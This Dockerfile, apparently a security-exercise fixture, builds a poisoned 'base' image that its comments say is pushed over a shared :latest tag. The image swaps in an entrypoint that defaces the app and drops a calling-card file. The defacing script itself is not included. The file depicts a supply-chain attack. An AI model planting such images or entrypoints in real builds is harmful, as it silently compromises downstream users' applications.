# 🍍 The Pineapple Pizza Mafia's base image. Byte-for-byte a normal base, plus
# an entrypoint that defaces the app and a calling card in a layer. Pushed
# over the crustadvisor/base:latest tag, so anyone who builds FROM :latest
# gets it without changing a line of their own code.
FROM python:3.12-slim
RUN pip install --no-cache-dir "fastapi>=0.115" "uvicorn[standard]>=0.30" "httpx>=0.27"
COPY entrypoint.evil.sh /entrypoint.sh
COPY ppm-deface.html /ppm-deface.html
RUN chmod +x /entrypoint.sh && echo "🍍 PPM was here" > /pineapple.txt
WORKDIR /app
EXPOSE 8000
ENTRYPOINT ["/entrypoint.sh"]
